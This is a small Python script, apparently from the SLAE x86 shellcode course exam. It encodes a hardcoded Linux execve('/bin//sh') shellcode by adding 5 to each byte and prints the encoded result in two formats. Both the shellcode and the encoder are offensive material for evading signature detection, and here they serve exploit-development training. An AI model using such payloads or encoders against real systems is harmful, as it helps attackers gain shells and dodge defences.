#!/usr/bin/env python
# Simple encoder for the SLAE x86 exam
# Adds 5 to each byte
# @_Kiewicz
shellcode = ("31,c0,50,68,2f,2f,73,68,68,2f,62,69,6e,89,e3,50,89,e2,53,89,e1,b0,0b,cd,80").split(',')

one = ""
two = ""
print('Encoding...')

# Convert to int base 16 
for i in shellcode:
        j = int(i, 16) + 5
	one += '\\x'
	one += '%02x' % j

	two += '0x'
	two += '%02x,' % j


print(one)
print('\n')
print(two)

print('\nLength: %d' % len(shellcode))
